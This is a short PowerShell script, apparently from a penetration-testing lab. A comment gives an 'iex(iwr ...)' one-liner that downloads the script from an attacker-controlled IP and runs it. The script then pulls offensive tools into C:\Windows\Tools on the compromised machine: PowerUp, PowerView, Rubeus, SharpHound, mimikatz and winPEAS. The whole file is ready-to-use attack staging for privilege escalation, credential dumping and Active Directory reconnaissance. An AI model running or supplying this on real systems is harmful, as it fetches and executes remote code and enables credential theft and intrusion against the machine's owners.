// type the following command in powershell to run the script
// iex(iwr -uri 192.168.45.213/transfer_files.ps1 -usebasicparsing)

$baseUrl = "http://192.168.45.213/"
$fileNames = @("PowerUp.ps1", "PowerView.ps1", "Rubeus.exe", "SharpHound.ps1", "mimikatz.exe", "winPEASx64.exe")
$downloadPath = "C:\Windows\Tools"

foreach ($fileName in $fileNames) {
	$url = $baseUrl + $fileName
	$filePath = Join-Path $downloadPath $fileName
	Invoke-WebRequest -Uri $url -OutFile $filePath
	Write-Host "Downloaded $fileName to $filePath"
}